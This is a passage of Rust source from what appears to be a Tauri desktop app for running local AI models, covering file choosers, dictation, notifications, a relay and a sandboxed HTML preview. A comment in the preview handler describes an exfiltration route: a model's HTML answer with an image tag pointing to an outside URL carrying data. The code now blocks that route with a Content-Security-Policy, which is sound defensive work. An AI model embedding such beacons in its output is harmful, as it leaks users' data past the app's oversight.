        return String::new();
    };
    // The child is killed at the deadline (a `find` over a slow NAS volume must
    // not keep hammering the disk after detection already moved on).
    match crate::tools::run_with_deadline(child, Instant::now() + Duration::from_secs(secs)) {
        Ok(o) => o.stdout,
        Err(_) => String::new(),
    }
}

fn find_registry(base: &str) -> Option<String> {
    let args: Vec<String> = [
        base, "-maxdepth", "6", "-type", "f", "-name", "models-registry.json", "-path",
        "*/scripts/*",
    ]
    .iter()
    .map(|s| s.to_string())
    .collect();
    let out = run_with_timeout("find", &args, 6);
    let line = out.lines().next()?;
    let p = Path::new(line);
    let root = p.parent()?.parent()?;
    if is_root(root) {
        Some(root.display().to_string())
    } else {
        None
    }
}

#[tauri::command]
fn detect_root() -> Option<String> {
    let map = settings_load();
    if let Some(r) = map.get("root") {
        if is_root(Path::new(r)) {
            return Some(r.clone());
        }
    }
    let home = std::env::var("HOME").unwrap_or_default();
    let mut bases = vec![
        home.clone(),
        format!("{home}/Documents"),
        format!("{home}/Developer"),
        format!("{home}/Projects"),
        format!("{home}/Desktop"),
    ];
    if let Ok(rd) = std::fs::read_dir("/Volumes") {
        for e in rd.flatten() {
            bases.push(e.path().display().to_string());
        }
    }
    for base in bases {
        if !Path::new(&base).exists() {
            continue;
        }
        if let Some(root) = find_registry(&base) {
            return Some(root);
        }
    }
    // No checkout anywhere: self-provision from the bundled data so the app
    // works out of the box.
    provision_default_root()
        .ok()
        .map(|p| p.display().to_string())
}

/// Native macOS folder chooser via osascript. Returns None on cancel.
#[tauri::command]
fn pick_folder() -> Result<Option<String>, String> {
    // The native panel first. It is this process's own window: no Apple Event,
    // no Automation permission, and nothing that can be refused on behalf of
    // somebody else. osascript's `choose folder` answered "cancelled by the
    // user" on a machine where nobody cancelled anything, which is what a
    // refused Apple Event looks like from the outside, and four rounds went
    // into that disguise.
    match swift_helper("galactus-pick") {
        Ok(bin) => {
            let out = Command::new(&bin)
                .arg("folder")
                .arg(std::env::var("HOME").unwrap_or_default())
                .output()
                .map_err(|e| e.to_string())?;
            return match out.status.code() {
                Some(0) => {
                    let p = String::from_utf8_lossy(&out.stdout).trim().to_string();
                    Ok(if p.is_empty() { None } else { Some(p) })
                }
                // 2 is a real cancel, and the helper is the only thing here that
                // can tell one from a failure without reading a sentence.
                Some(2) => Ok(None),
                _ => Err(format!(
                    "the folder chooser could not open: {}",
                    String::from_utf8_lossy(&out.stderr).trim()
                )),
            };
        }
        // No swiftc and no prebuilt helper: fall through to the old path rather
        // than refusing outright. It works on plenty of machines, and one that
        // cannot build the helper is not automatically one where it fails.
        Err(_) => {}
    }
    let out = Command::new("osascript")
        .arg("-e")
        .arg("POSIX path of (choose folder with prompt \"Select your Galactus folder\")")
        .output()
        .map_err(|e| e.to_string())?;
    if !out.status.success() {
        // EVERY failure used to return Ok(None), the same answer as "the user
        // pressed Cancel", so a chooser that could not open at all was
        // indistinguishable from one the user dismissed: the button appeared to
        // do nothing, twice, and there was nothing to read either time. The
        // stderr osascript writes was captured and thrown away on the same line.
        return match classify_chooser_failure(&String::from_utf8_lossy(&out.stderr)) {
            None => Ok(None),
            Some(reason) => Err(reason),
        };
    }
    let p = String::from_utf8_lossy(&out.stdout).trim().to_string();
    Ok(if p.is_empty() { None } else { Some(p) })
}

/// Native WAV chooser, for the speech-to-video models. Same helper, same
/// contract as pick_image; osascript fallback restricted to WAV.
#[tauri::command]
fn pick_audio() -> Result<Option<String>, String> {
    match swift_helper("galactus-pick") {
        Ok(bin) => {
            let out = Command::new(&bin)
                .arg("audio")
                .arg(std::env::var("HOME").unwrap_or_default())
                .output()
                .map_err(|e| e.to_string())?;
            return match out.status.code() {
                Some(0) => {
                    let p = String::from_utf8_lossy(&out.stdout).trim().to_string();
                    Ok(if p.is_empty() { None } else { Some(p) })
                }
                Some(2) => Ok(None),
                _ => Err(format!(
                    "the audio chooser could not open: {}",
                    String::from_utf8_lossy(&out.stderr).trim()
                )),
            };
        }
        Err(_) => {}
    }
    let out = Command::new("osascript")
        .arg("-e")
        .arg("POSIX path of (choose file of type {\"com.microsoft.waveform-audio\"} with prompt \"Choose a WAV file\")")
        .output()
        .map_err(|e| e.to_string())?;
    if !out.status.success() {
        return match classify_chooser_failure(&String::from_utf8_lossy(&out.stderr)) {
            None => Ok(None),
            Some(reason) => Err(reason),
        };
    }
    let p = String::from_utf8_lossy(&out.stdout).trim().to_string();
    Ok(if p.is_empty() { None } else { Some(p) })
}

/// Native image chooser, for the video models that animate a starting picture.
///
/// The same helper and the same contract as `pick_folder`, in file mode. The
/// osascript fallback mirrors the folder one for the same machine-without-
/// swiftc reason, and restricts to images the same way the panel does.
#[tauri::command]
fn pick_image() -> Result<Option<String>, String> {
    match swift_helper("galactus-pick") {
        Ok(bin) => {
            let out = Command::new(&bin)
                .arg("image")
                .arg(std::env::var("HOME").unwrap_or_default())
                .output()
                .map_err(|e| e.to_string())?;
            return match out.status.code() {
                Some(0) => {
                    let p = String::from_utf8_lossy(&out.stdout).trim().to_string();
                    Ok(if p.is_empty() { None } else { Some(p) })
                }
                Some(2) => Ok(None),
                // A bundled helper built before the image mode existed answers
                // a usage error on exit 1. Falling through to osascript keeps
                // the button working on an app whose packaged helper is stale.
                _ => match Command::new("osascript")
                    .arg("-e")
                    .arg("POSIX path of (choose file of type {\"public.png\", \"public.jpeg\"} with prompt \"Choose a starting picture\")")
                    .output()
                {
                    Ok(o) if o.status.success() => {
                        let p = String::from_utf8_lossy(&o.stdout).trim().to_string();
                        Ok(if p.is_empty() { None } else { Some(p) })
                    }
                    Ok(o) => match classify_chooser_failure(&String::from_utf8_lossy(&o.stderr)) {
                        None => Ok(None),
                        Some(reason) => Err(reason),
                    },
                    Err(e) => Err(e.to_string()),
                },
            };
        }
        Err(_) => {}
    }
    let out = Command::new("osascript")
        .arg("-e")
        .arg("POSIX path of (choose file of type {\"public.png\", \"public.jpeg\"} with prompt \"Choose a starting picture\")")
        .output()
        .map_err(|e| e.to_string())?;
    if !out.status.success() {
        return match classify_chooser_failure(&String::from_utf8_lossy(&out.stderr)) {
            None => Ok(None),
            Some(reason) => Err(reason),
        };
    }
    let p = String::from_utf8_lossy(&out.stdout).trim().to_string();
    Ok(if p.is_empty() { None } else { Some(p) })
}

/// What osascript's stderr means: nothing to report, or a sentence for the user.
///
/// Cancelling is not a fault and must stay silent, or every dismissed dialog
/// would raise an error toast. Anything else is a fault and has to be said,
/// because the alternative is a button that does nothing for a reason nobody
/// can see. Error -1743 is macOS refusing the app permission to send the event
/// at all, which no amount of clicking will fix and which names its own remedy.
fn classify_chooser_failure(stderr: &str) -> Option<String> {
    let text = stderr.trim();
    let lowered = text.to_lowercase();
    if text.is_empty() {
        return None;
    }
    // The CODE, not the sentence. osascript writes its errors in the user's
    // language: a French Mac says "Annule par l'utilisateur. (-128)", and the
    // first version of this function matched only the English wording, so every
    // ordinary cancel on a non-English Mac was reported as a fault. The number
    // is the same in every language and is the only part worth reading.
    if text.contains("-128") {
        return None;
    }
    if text.contains("-1743") || lowered.contains("not allowed to send apple events") {
        return Some(
            "macOS is refusing Galactus permission to open the folder chooser. \
             Open System Settings, Privacy and Security, Automation, and allow Galactus."
                .into(),
        );
    }
    Some(format!("the folder chooser could not open: {}", text.lines().next().unwrap_or(text)))
}


pub(crate) fn app_support() -> PathBuf {
    settings_path().parent().unwrap().to_path_buf()
}

// library: voir library.rs

// conversations: voir conversations.rs

// ---------------------------------------------------------------- voice

struct VoiceState {
    child: Option<Child>,
}

static VOICE: OnceLock<Mutex<VoiceState>> = OnceLock::new();

fn voice_state() -> &'static Mutex<VoiceState> {
    VOICE.get_or_init(|| Mutex::new(VoiceState { child: None }))
}

/// The on-device speech helper (Apple SFSpeechRecognizer): precompiled in the
/// bundle, compiled from source as a dev fallback.
fn voice_helper() -> Result<PathBuf, String> {
    if let Some(res) = resource_dir() {
        let prebuilt = res.join("packaged/galactus-voice");
        if prebuilt.is_file() {
            #[cfg(unix)]
            {
                use std::os::unix::fs::PermissionsExt;
                if let Ok(meta) = std::fs::metadata(&prebuilt) {
                    let mut perm = meta.permissions();
                    if perm.mode() & 0o111 == 0 {
                        perm.set_mode(0o755);
                        let _ = std::fs::set_permissions(&prebuilt, perm);
                    }
                }
            }
            return Ok(prebuilt);
        }
    }
    let bin = app_support().join("galactus-voice");
    let src = std::env::current_dir()
        .unwrap_or_default()
        .join("src-tauri/helpers/galactus-voice.swift");
    if !src.is_file() {
        return Err("voice helper not available".into());
    }
    if !bin.is_file() {
        std::fs::create_dir_all(app_support()).map_err(|e| e.to_string())?;
        let out = Command::new("swiftc")
            .args(["-O", "-o"])
            .arg(&bin)
            .arg(&src)
            .output()
            .map_err(|e| format!("swiftc unavailable ({e})"))?;
        if !out.status.success() {
            return Err("voice helper failed to build".into());
        }
    }
    Ok(bin)
}

/// Start on-device dictation. Streams `galactus://voice` events:
/// {kind: "partial"|"final"|"error", text}.
#[tauri::command]
fn voice_start(app: AppHandle, locale: Option<String>) -> Result<(), String> {
    let bin = voice_helper()?;
    {
        // One dictation at a time.
        let mut v = voice_state().lock().unwrap_or_else(|e| e.into_inner());
        if let Some(mut old) = v.child.take() {
            let _ = old.kill();
            let _ = old.wait();
        }
    }
    let mut child = Command::new(&bin)
        .arg("listen")
        .arg("--locale")
        .arg(locale.unwrap_or_else(|| "fr-FR".into()))
        .args(["--max-seconds", "90"])
        .stdout(Stdio::piped())
        .stderr(Stdio::null())
        .spawn()
        .map_err(|e| e.to_string())?;
    let stdout = child.stdout.take().ok_or("no stdout")?;
    let my_pid = child.id();
    voice_state().lock().unwrap_or_else(|e| e.into_inner()).child = Some(child);

    std::thread::spawn(move || {
        let reader = BufReader::new(stdout);
        let mut terminal_sent = false;
        for line in reader.lines() {
            // A line that does not decode is skipped, not fatal: this is a
            // child process's output, and one odd byte must not silence the
            // rest of it. Spelled out rather than written `.flatten()`, which
            // says the same thing and spins forever on a reader that fails
            // forever; a pipe reports EOF instead, so this loop ends.
            let Ok(line) = line else { continue };
            let (kind, text) = if let Some(t) = line.strip_prefix("PARTIAL ") {
                ("partial", t.to_string())
            } else if let Some(t) = line.strip_prefix("FINAL ") {
                ("final", t.to_string())
            } else if let Some(t) = line.strip_prefix("ERROR ") {
                ("error", t.to_string())
            } else {
                continue;
            };
            let _ = app.emit("galactus://voice", json!({"kind": kind, "text": text}));
            if kind != "partial" {
                terminal_sent = true;
                break;
            }
        }
        // The helper can die without a terminal line (killed hard, crash):
        // the UI must still get unstuck.
        if !terminal_sent {
            let _ = app.emit("galactus://voice", json!({"kind": "final", "text": ""}));
        }
        // Reap OUR child only, a fresh dictation may already have replaced
        // it; and never hold the lock across wait().
        let mine = {
            let mut v = voice_state().lock().unwrap_or_else(|e| e.into_inner());
            if v.child.as_ref().map(|c| c.id()) == Some(my_pid) {
                v.child.take()
            } else {
                None
            }
        };
        if let Some(mut c) = mine {
            let _ = c.wait();
        }
    });
    Ok(())
}

/// Graceful stop: SIGTERM lets the helper flush its FINAL line first.
#[tauri::command]
fn voice_stop() {
    let v = voice_state().lock().unwrap_or_else(|e| e.into_inner());
    if let Some(c) = v.child.as_ref() {
        let _ = Command::new("kill").args(["-TERM", &c.id().to_string()]).output();
    }
}

// ---------------------------------------------------------------- text-to-speech

static TTS: OnceLock<Mutex<Option<Child>>> = OnceLock::new();

/// Read text aloud with the system voice (`say`, fully offline). A new call
/// replaces the previous one.
#[tauri::command]
fn tts_speak(text: String) -> Result<(), String> {
    let mut slot = TTS.get_or_init(|| Mutex::new(None)).lock().unwrap_or_else(|e| e.into_inner());
    if let Some(mut old) = slot.take() {
        let _ = old.kill();
        let _ = old.wait();
    }
    let clipped: String = text.chars().take(4000).collect();
    let child = Command::new("say")
        .arg("--")
        .arg(clipped)
        .spawn()
        .map_err(|e| e.to_string())?;
    *slot = Some(child);
    Ok(())
}

#[tauri::command]
fn tts_stop() {
    let mut slot = TTS.get_or_init(|| Mutex::new(None)).lock().unwrap_or_else(|e| e.into_inner());
    if let Some(mut old) = slot.take() {
        let _ = old.kill();
        let _ = old.wait();
    }
}

// ---------------------------------------------------------------- notifications

/// Native macOS notification. Used when a long task finishes while the window
/// is in the background, and when a model finishes loading.
#[tauri::command]
fn notify(title: String, body: String) -> Result<(), String> {
    // Newlines would break the AppleScript literal (and the failure would be
    // silent since osascript's exit code is not checked).
    let esc = |s: &str| {
        s.replace('\\', "\\\\")
            .replace('"', "\\\"")
            .replace(['\n', '\r'], " ")
    };
    let script = format!(
        "display notification \"{}\" with title \"{}\" sound name \"Ping\"",
        esc(&body),
        esc(&title)
    );
    Command::new("osascript")
        .arg("-e")
        .arg(script)
        .spawn()
        .map(|_| ())
        .map_err(|e| e.to_string())
}

/// Live engine metrics: resident memory of the llama-server process.
#[tauri::command]
fn server_metrics() -> Value {
    let pid = {
        let s = server_state().lock().unwrap_or_else(|e| e.into_inner());
        match s.child.as_ref() {
            Some(c) => c.id(),
            None => return json!({ "running": false }),
        }
    };
    let rss_kb = Command::new("ps")
        .args(["-o", "rss=", "-p", &pid.to_string()])
        .output()
        .ok()
        .and_then(|o| String::from_utf8_lossy(&o.stdout).trim().parse::<u64>().ok())
        .unwrap_or(0);
    json!({ "running": true, "rss_bytes": rss_kb * 1024 })
}

#[tauri::command]
fn server_log() -> String {
    std::fs::read_to_string(app_support().join("llama-server.log")).unwrap_or_default()
}

// ------------------------------------------------------- preview protocol
//
// The live preview renders model-written HTML. Feeding it through an iframe
// `srcdoc` made it inherit the APP's content policy, which allows nothing
// external: every previewed page lost its images, fonts, stylesheets and
// scripts, and looked broken for a reason that had nothing to do with the
// page. A document served over its own scheme carries its own policy instead
// of inheriting ours, so the preview finally shows what a browser would show.
//
// The isolation is unchanged and does not rely on the policy: the frame keeps
// `sandbox="allow-scripts"` WITHOUT `allow-same-origin`, so the page lives in
// an opaque origin with no access to the app, no IPC, and no way to navigate
// it. That is the same exposure as the "open in browser" button next to it.

fn preview_slot() -> &'static Mutex<(u64, String)> {
    static SLOT: OnceLock<Mutex<(u64, String)>> = OnceLock::new();
    SLOT.get_or_init(|| Mutex::new((0, String::new())))
}

/// The folder the preview serves files from, when it is serving a site.
///
/// Distinct from the published-HTML slot above, which answers one document with
/// no sub-resources. A site is a folder: index.html asks for styles.css, which
/// asks for a font, and every one of those has to resolve to a real file inside
/// one directory and nowhere else.
fn preview_root_slot() -> &'static Mutex<Option<PathBuf>> {
    static ROOT: OnceLock<Mutex<Option<PathBuf>>> = OnceLock::new();
    ROOT.get_or_init(|| Mutex::new(None))
}

/// Point the preview at a folder, or at nothing.
#[tauri::command]
fn preview_set_root(root: Option<String>) -> Result<(), String> {
    let resolved = match root.as_deref().map(str::trim).filter(|s| !s.is_empty()) {
        Some(p) => Some(std::fs::canonicalize(p).map_err(|e| format!("{p}: {e}"))?),
        None => None,
    };
    *preview_root_slot().lock().unwrap_or_else(|e| e.into_inner()) = resolved;
    Ok(())
}

/// Resolve one request path inside the preview root, or refuse.
///
/// The containment check is the whole of the security here, and it is the same
/// shape as `inside()` in code.rs: canonicalise, then require the result to
/// start with the root. Canonicalising is what makes it hold, because "..",
/// a symlink out of the tree and an absolute path all become visible only after
/// the filesystem has resolved them.
fn preview_file_for(path: &str) -> Option<PathBuf> {
    let root = preview_root_slot().lock().unwrap_or_else(|e| e.into_inner()).clone()?;
    let rel = path.trim_start_matches('/');
    let rel = if rel.is_empty() { "index.html" } else { rel };
    // Percent-decoding, for the space in "my file.css". Only the escape itself:
    // anything else is left alone and will simply fail to open.
    let decoded = percent_decode(rel);
    let candidate = std::fs::canonicalize(root.join(&decoded)).ok()?;
    if !candidate.starts_with(&root) {
        return None;
    }
    candidate.is_file().then_some(candidate)
}

/// Minimal percent-decoding for a request path.
fn percent_decode(s: &str) -> String {
    let bytes = s.as_bytes();
    let mut out: Vec<u8> = Vec::with_capacity(bytes.len());
    let mut i = 0;
    while i < bytes.len() {
        if bytes[i] == b'%' && i + 2 < bytes.len() {
            let hex = std::str::from_utf8(&bytes[i + 1..i + 3]).ok();
            if let Some(v) = hex.and_then(|h| u8::from_str_radix(h, 16).ok()) {
                out.push(v);
                i += 3;
                continue;
            }
        }
        out.push(bytes[i]);
        i += 1;
    }
    String::from_utf8_lossy(&out).into_owned()
}

/// The content type for a file the preview serves.
///
/// A table rather than a crate. It is twenty lines, it covers what a static
/// site is made of, and an unknown extension is served as an opaque stream
/// rather than guessed at, because a wrong text/html on a binary is worse than
/// a download.
fn preview_mime(path: &Path) -> &'static str {
    match path.extension().and_then(|e| e.to_str()).unwrap_or("").to_ascii_lowercase().as_str() {
        "html" | "htm" => "text/html; charset=utf-8",
        "css" => "text/css; charset=utf-8",
        "js" | "mjs" => "text/javascript; charset=utf-8",
        "json" | "map" => "application/json; charset=utf-8",
        "svg" => "image/svg+xml",
        "png" => "image/png",
        "jpg" | "jpeg" => "image/jpeg",
        "gif" => "image/gif",
        "webp" => "image/webp",
        "avif" => "image/avif",
        "ico" => "image/x-icon",
        "woff" => "font/woff",
        "woff2" => "font/woff2",
        "ttf" => "font/ttf",
        "otf" => "font/otf",
        "mp4" => "video/mp4",
        "webm" => "video/webm",
        "mp3" => "audio/mpeg",
        "wav" => "audio/wav",
        "wasm" => "application/wasm",
        "txt" | "md" => "text/plain; charset=utf-8",
        _ => "application/octet-stream",
    }
}

/// Publish HTML for the preview frame and return the URL to point it at. The
/// id changes on every call so the webview reloads instead of serving a
/// cached document; only the latest page is kept.
#[tauri::command]
fn preview_publish(html: String) -> String {
    let mut slot = preview_slot().lock().unwrap_or_else(|e| e.into_inner());
    slot.0 += 1;
    slot.1 = html;
    format!("gxpreview://localhost/p/{}", slot.0)
}

// ---------------------------------------------------------------- entry


// ---------------------------------------------------------------- relay
//
// The engine is never exposed directly. See relay.rs for why: the bundled
// llama-server has no authentication option at all and its CORS default is
// `*`, so binding it outside 127.0.0.1 would publish an open endpoint.

#[tauri::command]
fn relay_status() -> relay::RelayStatus {
    relay::status()
}

/// Mint a new key. Returned ONCE, to be shown once and then stored by the user.
#[tauri::command]
fn relay_new_key() -> Result<String, String> {
    relay::generate_key()
}

/// Start the relay. `bind` is "127.0.0.1" or "0.0.0.0"; anything else is
/// refused in relay.rs rather than attempted.
#[tauri::command]
fn relay_start(bind: String, port: u16, key: String) -> Result<relay::RelayStatus, String> {
    let engine_port = {
        let s = server_state().lock().unwrap_or_else(|e| e.into_inner());
        match s.child.is_none() {
            // Zero means "no text model", and the relay answers text requests
            // with a 503 that says which. It is allowed because the image
            // routes are served by this process rather than proxied: a Mac
            // whose job is making pictures for a team should not have to load
            // a language model it will never be asked anything.
            true if image::image_engine_present() => 0,
            true => return Err("start a model before opening the relay".into()),
            false => {
                if s.port == 0 { SERVER_PORT_BASE } else { s.port }
            }
        }
    };
    relay::start(&bind, port, engine_port, &key)?;
    Ok(relay::status())
}

#[tauri::command]
fn relay_stop() -> relay::RelayStatus {
    relay::stop();
    relay::status()
}

/// Addresses this Mac can be reached on, for the connection snippets.
///
/// Reads the interfaces rather than guessing: telling the user to try
/// "your local IP" is how an integration guide becomes useless.
#[tauri::command]
fn relay_addresses() -> Vec<String> {
    let mut out = vec!["127.0.0.1".to_string()];
    if let Ok(o) = Command::new("/usr/sbin/ipconfig").args(["getifaddr", "en0"]).output() {
        let ip = String::from_utf8_lossy(&o.stdout).trim().to_string();
        if !ip.is_empty() {
            out.push(ip);
        }
    }
    if let Ok(o) = Command::new("/usr/sbin/ipconfig").args(["getifaddr", "en1"]).output() {
        let ip = String::from_utf8_lossy(&o.stdout).trim().to_string();
        if !ip.is_empty() && !out.contains(&ip) {
            out.push(ip);
        }
    }
    out
}

// ---------------------------------------------------------------- the tray
//
// Server mode runs unattended work in a window nobody is looking at. The red
// button already hides that window rather than destroying it (see
// on_window_event below), which is the only reason a scheduled job can drive
// an agent at 03:00: the agent loop lives in the webview, and a destroyed
// webview takes it with it.
//
// Hiding a window that is still working is exactly the "invisible but running"
// state that makes people distrust an app, so server mode also puts an item in
// the menu bar. It says the app is there, it brings the window back, and it
// offers the one action that genuinely stops the work: Quit.

const TRAY_ID: &str = "galactus-tray";

fn tray_show(app: &AppHandle) -> Result<(), String> {
    use tauri::menu::{Menu, MenuItem};
    use tauri::tray::TrayIconBuilder;

    if app.tray_by_id(TRAY_ID).is_some() {
        return Ok(());
    }
    let show = MenuItem::with_id(app, "tray-show", "Show Galactus", true, None::<&str>)
        .map_err(|e| e.to_string())?;
    let quit = MenuItem::with_id(
        app,
        "tray-quit",
        "Quit Galactus (stops scheduled jobs)",
        true,
        None::<&str>,
    )
    .map_err(|e| e.to_string())?;
    let menu = Menu::with_items(app, &[&show, &quit]).map_err(|e| e.to_string())?;
    let mut builder = TrayIconBuilder::with_id(TRAY_ID)
        .menu(&menu)
        .tooltip("Galactus, server mode")
        .show_menu_on_left_click(true);
    if let Some(icon) = app.default_window_icon().cloned() {
        builder = builder.icon(icon).icon_as_template(true);
    }
    builder
        .on_menu_event(|app, event| match event.id.as_ref() {
            "tray-show" => {
                if let Some(w) = app.get_webview_window("main") {
                    let _ = w.show();
                    let _ = w.set_focus();
                }
            }
            "tray-quit" => app.exit(0),
            _ => {}
        })
        .build(app)
        .map_err(|e| e.to_string())?;
    Ok(())
}

/// Show or hide the menu bar item. Called by the frontend when the app mode
/// changes, and at startup from the stored mode.
#[tauri::command]
fn tray_set(app: AppHandle, on: bool) -> Result<(), String> {
    if on {
        tray_show(&app)
    } else {
        app.remove_tray_by_id(TRAY_ID);
        Ok(())
    }
}

/// Register the update plugins.
///
/// Split out of `run` because the two plugins are desktop-only and the
/// `cfg` has to sit on a statement rather than in the middle of a builder
/// chain. The updater is registered unconditionally at startup, which is NOT
/// the same thing as checking for an update at startup: registering only
/// installs the commands the frontend may call. Whether a check ever happens,
/// and whether a restart ever follows it, is decided in the frontend, where
/// the app knows if a human is watching (see updateSection in main.ts).
#[cfg(desktop)]
fn with_updates<R: tauri::Runtime>(b: tauri::Builder<R>) -> tauri::Builder<R> {
    b.plugin(tauri_plugin_updater::Builder::new().build())
        .plugin(tauri_plugin_process::init())
}

#[cfg(not(desktop))]
fn with_updates<R: tauri::Runtime>(b: tauri::Builder<R>) -> tauri::Builder<R> {
    b
}

#[cfg_attr(mobile, tauri::mobile_entry_point)]
pub fn run() {
    with_updates(tauri::Builder::default())
        .register_uri_scheme_protocol("gxpreview", |_app, request| {
            // TWO things answer on this scheme, and they are not the same shape.
            //
            // /p/<n> is the Chat preview: one self-contained document with no
            // sub-resources, published by preview_publish. Sealed as tightly as
            // it has always been.
            //
            // Anything else is the Code preview: a folder on disk, where
            // index.html asks for styles.css which asks for a font. Those files
            // have to resolve, so this branch serves them, and its policy has to
            // allow the document to load them. It still cannot reach the network:
            // every source below is the preview scheme itself.
            let path = request.uri().path().to_string();
            if !path.starts_with("/p/") {
                let Some(file) = preview_file_for(&path) else {
                    return tauri::http::Response::builder()
                        .status(404)
                        .header("Content-Type", "text/plain; charset=utf-8")
                        .body(b"not found in the preview folder".to_vec())
                        .unwrap_or_else(|_| {
                            tauri::http::Response::builder().status(500).body(Vec::new()).unwrap()
                        });
                };
                let mime = preview_mime(&file);
                let body = std::fs::read(&file).unwrap_or_default();
                let mut builder = tauri::http::Response::builder()
                    .status(200)
                    .header("Content-Type", mime)
                    .header("Cache-Control", "no-store");
                if mime.starts_with("text/html") {
                    // 'self' here means this scheme and this scheme only, which
                    // is the preview folder. The seal that matters is unchanged:
                    // no http, no https, so a page the model wrote cannot carry
                    // anything out, and a CDN it references simply does not load.
                    builder = builder.header(
                        "Content-Security-Policy",
                        "default-src 'none'; \
                         img-src 'self' data: blob:; \
                         style-src 'self' 'unsafe-inline' data:; \
                         script-src 'self' 'unsafe-inline' 'unsafe-eval' data: blob:; \
                         font-src 'self' data:; \
                         media-src 'self' data: blob:; \
                         connect-src 'self'; \
                         form-action 'none'; \
                         base-uri 'none'; \
                         frame-src 'self'; \
                         frame-ancestors 'self'",
                    );
                }
                return builder.body(body).unwrap_or_else(|_| {
                    tauri::http::Response::builder().status(500).body(Vec::new()).unwrap()
                });
            }
            let html = preview_slot()
                .lock()
                .unwrap_or_else(|e| e.into_inner())
                .1
                .clone();
            tauri::http::Response::builder()
                .status(200)
                .header("Content-Type", "text/html; charset=utf-8")
                // The preview's own policy. It used to be `default-src *`,
                // which made this a FOURTH way out to the network, and the
                // only one with no dialog, no URL shown and no tool card: a
                // model that answered with an html block carrying
                // `<img src="https://elsewhere/?d=...">` exfiltrated on a
                // single click of the preview button, while the README
                // promised every exit was announced.
                //
                // The preview is now sealed. Everything it renders must be in
                // the document: inline styles and scripts still work, data and
                // blob URLs still work, so a self-contained page previews
                // exactly as before. What no longer works is reaching out, and
                // that is the entire point. `frame-ancestors 'self'` keeps the
                // page from re-embedding the app; `form-action 'none'` closes
                // the submit route out, which default-src does not cover.
                .header(
                    "Content-Security-Policy",
                    "default-src 'none'; \
                     img-src data: blob:; \
                     style-src 'unsafe-inline' data:; \
                     script-src 'unsafe-inline' 'unsafe-eval' data: blob:; \
                     font-src data:; \
                     media-src data: blob:; \
                     connect-src 'none'; \
                     form-action 'none'; \
                     base-uri 'none'; \
                     frame-ancestors 'self'",
                )
                .header("Cache-Control", "no-store")
                .body(html.into_bytes())
                .unwrap_or_else(|_| {
                    tauri::http::Response::builder().status(500).body(Vec::new()).unwrap()
                })
        })
        .setup(|app| {
            let _ = app.get_webview_window("main");
            // The relay serves pictures itself (imgapi.rs) and has no handle of
            // its own; with this, a generation asked for over the network shows
            // in the window like any other.
            relay::set_app(app.handle().clone());
            if let Err(e) = harden_settings_permissions() {
                eprintln!("Galactus settings permission hardening failed: {e}");
            }
            crate::library::seed_bundled_skills();
            if let Err(e) = crate::library::seed_bundled_vault() {
                eprintln!("Galactus vault seeding failed: {e}");
            }
            // The clock starts with the process and not with the view: a
            // schedule that only ticked while the Runs screen was open would
            // be a schedule that stops when someone switches to Settings.
            // The clock is started by the frontend, once it is listening. See
            // scheduler::jobs_ready.
            // Take back what earlier sessions left behind. Off the main thread
            // and silent: a machine that cannot delete a temporary file must
            // still start, and this is not news the user asked for.
            std::thread::spawn(|| {
                let swept = housekeeping::sweep_all(&app_support());
                if swept.files > 0 {
                    eprintln!(
                        "galactus: housekeeping removed {} files ({:.1} MB)",
                        swept.files,
                        swept.bytes as f64 / 1e6
                    );
                }
            });
            if settings_load().get("app_mode").map(|m| m == "server").unwrap_or(false) {
                if let Err(e) = tray_show(app.handle()) {
                    eprintln!("Galactus tray failed: {e}");
                }
            }
            Ok(())
        })
        .on_window_event(|window, event| {
            // macOS convention: the red button hides the window, the app
            // lives on in the Dock; ⌘Q is the one that really quits (and
            // takes the engine down through RunEvent::Exit below).
            if let tauri::WindowEvent::CloseRequested { api, .. } = event {
                let _ = window.hide();
                api.prevent_close();
            }
        })
        .invoke_handler(tauri::generate_handler![
            hw_info,
            load_registry,
            server_status,
            server_start,
            server_stop,
            engine_diagnose,
            install::install_model,
            install::cancel_install,
            install::delete_model,
            list_volumes,
            volume_bandwidth,
            recommend_for_model,
            tools::tool_fs_read,
            tools::tool_web_fetch,
            tools::scratch_write,
            tools::tool_fs_write,
            tools::tool_fs_preview,
            tools::tool_fs_revert,
            tools::tool_fs_list,
            tools::tool_shell_run,
            notify,
            server_log,
            server_metrics,
            settings_get,
            release_notes,
            settings_set,
            mcp_config_set,
            root_set,
            mcp_reload,
            mcp_tools,
            mcp_call,
            detect_root,
            pick_folder,
            pick_image,
            pick_audio,
            library::memory_read,
            library::memory_write,
            library::memory_save,
            library::memory_append,
            library::obsidian_search,
            library::obsidian_read,
            library::obsidian_append,
            library::obsidian_graph,
            library::obsidian_write,
            library::obsidian_resolve,
            library::obsidian_create_vault,
            library::skills_list,
            library::skill_read,
            library::learned_list,
            library::learned_write,
            library::learned_delete,
            library::learned_folder,
            conversations::conv_list,
            conversations::conv_load,
            conversations::conv_save,
            conversations::conv_delete,
            conversations::conv_search,
            conversations::conv_read,
            documents::doc_read,
            documents::doc_edit,
            documents::doc_capabilities,
            voice_start,
            voice_stop,
            tts_speak,
            tts_stop,
            knowledge::kb_folders,
            knowledge::kb_set_folders,
            knowledge::kb_reindex,
            knowledge::kb_stats,
            code::code_tree,
            code::code_read,
            code::code_write,
            code::code_stamp,
            code::git_info,
            code::git_status,
            code::git_log,
            code::git_diff,
            code::git_file_diff,
            code::git_show_file,
            code::git_stage,
            code::git_commit,
            code::git_clone,
            image::image_models,
            image::image_engine_present,
            image::image_install,
            image::image_generate,
            image::image_cancel,
            image::image_install_cancel,
            image::image_gallery,
            image::image_read,
            image::image_forget,
            image::image_export,
            code::code_create,
            code::code_rename,
            code::code_delete,
            ssh::ssh_hosts,
            ssh::ssh_host_save,
            ssh::ssh_host_remove,
            ssh::ssh_spawn,
            secaudit::sec_scan_ports,
            secaudit::sec_audit_web,
            code::git_push,
            code::git_pull,
            code::git_branches,
            code::git_checkout,
            // Workspace engine: enumeration, project search, symbol index.
            // The toolchain probe is NOT exposed as a command: git availability
            // reaches the front end through GitInfo.available, and nothing in
            // the app acts on node, cargo or make.
            search::search_start,
            search::search_cancel,
            search::search_files,
            symbols::symbols_index,
            symbols::symbols_query,
            // Tier A: the bulk snapshot the in-app TypeScript service reads.
            snapshot::code_snapshot,
            // Tier B, Python: exact SyntaxError and outline from bundled CPython.
            pylang::py_analyze,
            rust_analyzer_paths,
            // Tier A for .rs: the bundled rust-analyzer over LSP. The command
            // surface is deliberately thin, and lsp.rs refuses any method that
            // is not read-only (no executeCommand, no formatting: both would
            // run the project's own toolchain).
            lsp::rust_lsp_start,
            lsp::rust_lsp_stop,
            lsp::rust_lsp_status,
            lsp::rust_lsp_request,
            lsp::rust_lsp_notify,
